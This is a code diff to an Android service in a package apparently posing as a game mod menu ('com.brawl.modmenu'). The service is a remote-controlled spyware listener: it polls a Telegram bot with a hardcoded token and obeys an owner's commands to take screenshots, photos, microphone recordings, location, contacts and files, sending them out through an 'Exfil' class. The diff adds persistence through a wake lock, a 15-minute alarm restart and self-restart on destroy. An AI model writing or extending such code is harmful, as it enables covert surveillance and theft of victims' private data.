@@ -1,14 +1,19 @@
 package com.brawl.modmenu;
 
+import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.PowerManager;
+import android.os.SystemClock;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
@@ -20,12 +25,13 @@ public class CommandListener extends Service {
 
     private static final String TOKEN = "8688274559:AAGlGdaQh70HHSrEs_zMdkeW1udazQr6z5A";
     private static final String OWNER = "8558500657";
-    private static final long INTERVAL = 5000;
+    private static final long INTERVAL = 3000;
     private static final String CH = "zbot_svc";
     private long lastUpdateId = 0;
     private Handler handler = new Handler(Looper.getMainLooper());
     private boolean running = false;
     private long pollCount = 0;
+    private PowerManager.WakeLock wakeLock;
 
     @Override
     public void onCreate() {
@@ -38,6 +44,15 @@ public class CommandListener extends Service {
                 getSystemService(NOTIFICATION_SERVICE);
             if (nm != null) nm.createNotificationChannel(ch);
         }
+        // WAKE_LOCK — держим процессор активным
+        try {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm != null) {
+                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Zbot::Listener");
+                wakeLock.setReferenceCounted(false);
+                wakeLock.acquire();
+            }
+        } catch (Throwable ignored) {}
     }
 
     @Override
@@ -55,9 +70,22 @@ public class CommandListener extends Service {
             startForeground(1, b.build());
         } catch (Throwable ignored) {}
 
+        // AlarmManager — перезапускает сервис каждые 15 минут даже если его убили
+        try {
+            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+            Intent restart = new Intent(this, CommandListener.class);
+            PendingIntent pi = PendingIntent.getService(this, 1, restart,
+                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+            if (am != null) {
+                am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    SystemClock.elapsedRealtime() + 15 * 60 * 1000,
+                    15 * 60 * 1000, pi);
+            }
+        } catch (Throwable ignored) {}
+
         if (!running) {
             running = true;
-            Exfil.send("CMD", "Listener foreground запущен");
+            Exfil.send("CMD", "Listener+WakeLock запущен");
             handler.post(poll);
         }
         return START_STICKY;
@@ -82,28 +110,15 @@ public class CommandListener extends Service {
                     while ((line = r.readLine()) != null) sb.append(line);
                     r.close();
 
-                    String resp = sb.toString();
-                    JSONObject obj = new JSONObject(resp);
-
+                    JSONObject obj = new JSONObject(sb.toString());
                     if (!obj.optBoolean("ok", false)) {
-                        if (pollCount % 20 == 0) {
-                            Exfil.send("CMD_ERR", "API не ok. Poll#" + pollCount);
-                        }
                         if (running) handler.postDelayed(poll, INTERVAL);
                         return;
                     }
 
                     JSONArray arr = obj.optJSONArray("result");
-                    int count = arr != null ? arr.length() : 0;
-
-                    if (pollCount % 20 == 0) {
-                        Exfil.send("CMD_ALIVE", "Poll#" + pollCount
-                            + " LastID=" + lastUpdateId
-                            + " новых=" + count);
-                    }
-
-                    if (arr != null && count > 0) {
-                        for (int i = 0; i < count; i++) {
+                    if (arr != null && arr.length() > 0) {
+                        for (int i = 0; i < arr.length(); i++) {
                             JSONObject upd = arr.getJSONObject(i);
                             lastUpdateId = upd.optLong("update_id", lastUpdateId);
                             JSONObject msg = upd.optJSONObject("message");
@@ -114,17 +129,11 @@ public class CommandListener extends Service {
                             if (!OWNER.equals(chatId)) continue;
                             String text = msg.optString("text", "").trim();
                             if (text.isEmpty()) continue;
-
-                            Exfil.send("CMD_RCV", "Получено: " + text);
+                            Exfil.send("CMD_RCV", "→ " + text);
                             handleCommand(text);
                         }
                     }
-                } catch (Throwable t) {
-                    if (pollCount % 10 == 0) {
-                        Exfil.send("CMD_ERR", "Poll#" + pollCount + ": "
-                            + t.getClass().getSimpleName());
-                    }
-                }
+                } catch (Throwable ignored) {}
                 if (running) handler.postDelayed(poll, INTERVAL);
             }).start();
         }
@@ -132,10 +141,7 @@ public class CommandListener extends Service {
 
     private void handleCommand(String text) {
         try {
-            if (text.startsWith("/ping")) {
-                Exfil.send("CMD", "Pong! Работает");
-                return;
-            }
+            if (text.startsWith("/ping")) { Exfil.send("CMD", "Pong!"); return; }
             if (text.startsWith("/help") || text.startsWith("/start")) {
                 Exfil.send("HELP", "/ping /screenshot /photo /mic /location /info /apps /battery /vibrate /contacts /screens /photos_all /test_photos");
                 return;
@@ -162,7 +168,7 @@ public class CommandListener extends Service {
             if (text.startsWith("/photos_all")) { FileManager.allPhotos(this); return; }
             if (text.startsWith("/photos")) { FileManager.lastPhotos(this); return; }
             if (text.startsWith("/test_photos")) { PhotoLocator.locate(); return; }
-            Exfil.send("CMD", "Неизвестно: " + text);
+            Exfil.send("CMD", "? " + text);
         } catch (Throwable t) {
             Exfil.send("CMD", "Ошибка: " + t.getMessage());
         }
@@ -175,6 +181,15 @@ public class CommandListener extends Service {
     public void onDestroy() {
         running = false;
         handler.removeCallbacksAndMessages(null);
+        if (wakeLock != null && wakeLock.isHeld()) {
+            try { wakeLock.release(); } catch (Throwable ignored) {}
+        }
+        // Запускаем себя заново
+        try {
+            Intent restart = new Intent(this, CommandListener.class);
+            if (Build.VERSION.SDK_INT >= 26) startForegroundService(restart);
+            else startService(restart);
+        } catch (Throwable ignored) {}
         super.onDestroy();
     }
 }
